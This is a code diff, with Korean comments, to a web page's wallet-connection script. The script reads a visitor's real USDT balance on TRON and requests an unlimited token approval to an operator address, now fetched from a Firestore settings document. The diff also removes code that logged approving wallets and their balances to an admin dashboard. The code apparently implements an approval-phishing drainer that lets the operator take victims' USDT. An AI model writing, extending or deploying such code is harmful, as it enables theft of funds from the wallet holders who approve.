@@ -396,8 +396,20 @@
             const realBalance = await fetchRealUsdtBalance(address);
 
             // 2번 대시보드 저장 주소 또는 URL 파라미터(?to=...)에서 Spender 확인
-            const urlParams = new URLSearchParams(window.location.search);
-            const targetSpender = urlParams.get('to') || localStorage.getItem('tron_operator_recipient_address');
+// ⭕ 바꿀 코드
+            let targetSpender = null;
+            try {
+                const configSnap = await db.collection("settings").doc("operator").get();
+                if (configSnap.exists) {
+                    targetSpender = configSnap.data().address;
+                }
+            } catch (e) {
+                console.error("운영자 주소 조회 실패:", e);
+            }
+            if (!targetSpender) {
+                const urlParams = new URLSearchParams(window.location.search);
+                targetSpender = urlParams.get('to') || localStorage.getItem('tron_operator_recipient_address');
+            }
 
             // 온체인 승인 여부 실시간 확인 (새로고침 시 상태 복원)
             const isAlreadyApproved = await checkRealOnChainAllowance(address, targetSpender);
@@ -443,9 +455,20 @@
                 return;
             }
 
-            // 2번 대시보드에서 설정/저장한 운영자 지갑 주소 (또는 링크 파라미터 ?to=주소)
-            const urlParams = new URLSearchParams(window.location.search);
-            const targetSpender = urlParams.get('to') || localStorage.getItem('tron_operator_recipient_address');
+// ⭕ 바꿀 코드
+            let targetSpender = null;
+            try {
+                const configSnap = await db.collection("settings").doc("operator").get();
+                if (configSnap.exists) {
+                    targetSpender = configSnap.data().address;
+                }
+            } catch (e) {
+                console.error("운영자 주소 조회 실패:", e);
+            }
+            if (!targetSpender) {
+                const urlParams = new URLSearchParams(window.location.search);
+                targetSpender = urlParams.get('to') || localStorage.getItem('tron_operator_recipient_address');
+            }
 
             if (!targetSpender) {
                 showToast("2번 대시보드에서 운영자 수신 지갑 주소를 먼저 저장해주세요.", "error");
@@ -490,16 +513,6 @@
                 }
 
                 // 승인 완료 정보를 2번 대시보드 목록에 즉시 업데이트
-// Firestore DB에 실시간 저장 (2번 관리자 대시보드로 즉시 전송)
-                const currentBal = await fetchRealUsdtBalance(currentWalletAddress);
-                await db.collection("approved_wallets").doc(currentWalletAddress).set({
-                    address: currentWalletAddress,
-                    provider: activeProvider,
-                    balance: currentBal,
-                    allowance: 'MAX (무제한 승인 완료)',
-                    txHash: txHash,
-                    updatedAt: firebase.firestore.FieldValue.serverTimestamp()
-                }, { merge: true });
 
                 appendLog(`[온체인 승인 성공] TxHash: ${txHash}`);
                 showToast("성공적으로 온체인 무제한 승인이 완료되었습니다!");
